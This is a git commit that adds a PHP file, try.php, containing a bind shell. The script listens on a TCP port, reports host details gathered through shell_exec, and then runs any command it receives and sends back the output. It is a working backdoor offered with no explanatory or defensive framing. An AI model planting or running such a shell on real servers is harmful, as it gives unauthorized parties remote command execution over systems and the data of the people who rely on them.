e9c5d26adc59b7ffb3ba7a039a7efdbc8fdca047
RhzA <sanyamoiseev@yandex.ru>
2020-03-19 13:44:35 -0400

    v1

---
+++ try.php
@@ -0,0 +1,43 @@
+<?php
+        $address = '127.0.0.1'; // As its a bind shell it will always host on the local machine
+        // Set the ip and port we will listen o
+        $port = 5551;
+        // Set time limit to indefinite execution
+        set_time_limit (0);
+        if(function_exists("socket_create"))
+        {
+        // Create a TCP Stream socket
+        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+
+        // Bind the socket to an address/port
+        if(socket_bind($sockfd, $address, $port) == FALSE)
+        {
+            echo "Cant Bind to the specified port and address!";
+        }
+        // Start listening for connections
+        socket_listen($sockfd,15);
+        /* Accept incoming requests and handle them as child processes */
+        $client = socket_accept($sockfd); 
+        {
+            socket_write($client , "\n\n");
+            socket_write($client , shell_exec("date /t & time /t")  . "\n" . shell_exec("ver") . shell_exec("date") . "\n" . shell_exec("uname -a"));
+            socket_write($client , "\n\n");
+            while(1)
+            {
+                // Print Command prompt
+                $commandPrompt ="(Bind-Shell)[$]> ";
+                $maxCmdLen = 31337;
+                socket_write($client,$commandPrompt);
+                $cmd = socket_read($client,$maxCmdLen);
+                if($cmd == FALSE)
+                {
+                    echo "The client Closed the conection!";
+                    break;
+                }
+                socket_write($client , shell_exec($cmd));
+            }
+        }
+        socket_shutdown($client, 2);
+        socket_close($socket);
+        }
+    ?>
